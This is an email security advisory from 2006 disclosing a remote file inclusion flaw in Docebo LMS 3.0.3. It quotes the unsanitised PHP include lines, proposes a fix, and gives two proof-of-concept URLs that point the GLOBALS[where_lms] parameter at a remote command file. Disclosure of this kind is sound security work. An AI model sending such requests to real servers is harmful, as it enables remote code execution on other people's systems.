
Date: Fri, 09 Jun 2006 07:31:46 +0200
From: Federico Fazzi <federico@...istici.org>
To: secunia-vuln-report <vuln@...unia.com>,
	securiteam <news@...uriteam.com>, bugtraq@...urityfocus.com
Subject: Docebo Lms 3.0.3, Remote command execution


-----------------------------------------------------
Advisory id: FSA:010

Author:    Federico Fazzi
Date:	   09/06/2006, 7:24
Sinthesis: Docebo Lms 3.0.3, Remote command execution
Type:	   high
Product:   http://www.docebolms.org/
Patch:	   unavailable
-----------------------------------------------------


1) Description:

Error occured in class.definition.php,

include($GLOBALS['where_lms'].'/modules/'.$this->module_name.'/'.$this->module_name.'.php');

Error occured in scorm_utils.php,

include_once( $GLOBALS['where_lms'] . '/config.php' );

The users can include a remote file because
the $GLOBALS['where_lms'] isn't sanitized

2) Proof of concept:

http://example/[dc_path]/class.module/class.definition.php?GLOBALS[where_lms]=[cmd_url]
http://example/[dc_path]/modules/scorm/scorm_utils.php?GLOBALS[where_lms]=[cmd_url]

3) Solution:

include file where are declare $GLOBALS[*]




